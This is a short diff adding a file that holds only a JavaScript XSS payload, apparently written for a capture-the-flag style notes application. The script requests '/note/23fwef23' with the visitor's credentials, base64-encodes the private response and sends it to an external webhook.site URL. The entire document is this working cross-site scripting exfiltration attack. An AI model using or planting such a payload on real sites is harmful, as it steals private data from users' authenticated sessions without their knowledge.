@@ -1,0 +1,18 @@
+<script>
+
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() { 
+        console.log(xhr.readyState);
+        console.log(xhr.status);
+        if (xhr.readyState == 4) {
+            //console.log(xhr.response);
+            var xhr2 = new XMLHttpRequest();
+            xhr2.open('GET', 'https://webhook.site/93ddffb9-857a-4a78-ad47-f4a7526ecbe8/?'+btoa(xhr.response), true);
+            xhr2.send(null);
+        }
+    }
+    xhr.open('GET', '/note/23fwef23', true);
+    xhr.withCredentials = true;
+    
+    xhr.send(null);
+    </script>
